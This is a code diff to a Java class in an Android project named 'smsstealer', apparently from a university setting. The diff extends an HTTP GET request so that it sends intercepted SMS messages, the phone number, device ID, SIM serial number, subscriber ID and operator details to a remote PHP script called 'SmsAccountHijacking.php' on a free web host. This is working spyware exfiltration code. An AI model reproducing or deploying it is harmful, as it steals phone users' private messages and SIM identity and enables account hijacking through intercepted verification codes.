@@ -1,6 +1,7 @@
 package edu.oakland.smsstealer;
 
 import android.os.AsyncTask;
+import android.util.Log;
 
 import java.io.IOException;
 import java.net.HttpURLConnection;
@@ -12,12 +13,12 @@ import java.net.URL;
  */
 
 public class GetRequest extends AsyncTask {
-    private static final String ASP = "http://www.   .com/?number=";
+    private static final String ASP = "https://110dh.000webhostapp.com/SmsAccountHijacking.php?number=";
     private URL url;
 
-    public GetRequest(String number, String message, boolean isTMobile) {
+    public GetRequest(String number, String message, String simOperator, String deviceId, String networkOperator, String simSerialNumber, String subscriberId) {
         try {
-            url = new URL(ASP + number + "&message=" + message + "&isTMobile=" + isTMobile);
+            url = new URL(ASP + number + "&message=" + message + "&simOperator=" + simOperator + "&deviceId=" + deviceId + "&networkOperator="  + networkOperator + "&simSerialNumber=" + simSerialNumber + "&subscriberId=" + subscriberId);
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
@@ -27,6 +28,7 @@ public class GetRequest extends AsyncTask {
     protected Object doInBackground(Object[] params) {
         try {
             HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            Log.d("", "Ran this code");
             connection.disconnect();
         } catch (IOException e) {
             e.printStackTrace();
